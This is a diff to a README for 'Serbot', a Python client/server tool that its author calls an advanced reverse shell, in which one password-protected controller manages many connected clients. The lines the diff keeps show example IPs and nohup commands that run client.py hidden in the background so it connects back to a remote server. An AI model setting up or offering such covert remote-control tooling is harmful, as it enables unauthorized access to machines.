@@ -1,13 +1,5 @@
-Hello everyone,
-
-![alt tag](http://i.imgur.com/L7RQlzv.png)
-![alt tag](http://i.imgur.com/YQ81qSZ.png)
-
-Serbot is hot, keep reading Lol.
-
-So, lets just get to the point, I’ve showed you [Awrs](http://dotcppfile.wordpress.com/2014/11/03/awrs-advanced-clientserver-windowslinux-python-reverse-shell/) and what it’s capable of, considered as one of the best Reverse Shells I’ve decided to Update Awrs and create Serbot and no, it’s not what you think Lol.
-
 Serbot is an advanced version of Awrs where the Server can be managed by 1 Controller at a time.
+
 ######Example:
 Server hosted on 15.48.158.15 and accepts up to 100 clients through port 1567, accepts 1 Controller at a time through port 2357 and the Controller’s functions are protected with a password: “IAmAPassword”
 Client 1 hosted on 86.58.157.25 connected to 15.48.158.15:1567
@@ -60,14 +52,7 @@ This list isn’t enough but that’s all that I can think of right now. If you 
 
 You simply have to remove the “#!/usr/bin/env python2″ at the top of every script to get this up and running on windows.
 
-#####Extra:
-If you’re trying to activate the Client threw ssl, shell or web shell then you have to run the Client.py in another process in the background or else your shell will dive into an endless loop and the best way to do that in Linux would be using nohup.
-
 ######Example:
 nohup python client.py 15.48.158.15 1567 > /dev/null &
 
 nohup python client.py 15.48.158.15 1567 > /dev/null 2>&1 &
-
-Greetings to Team Prophetic, Chaoshackerz and all the followers of https://dotcppfile.wordpress.com/,
-That’s all,
-dotcppfile.
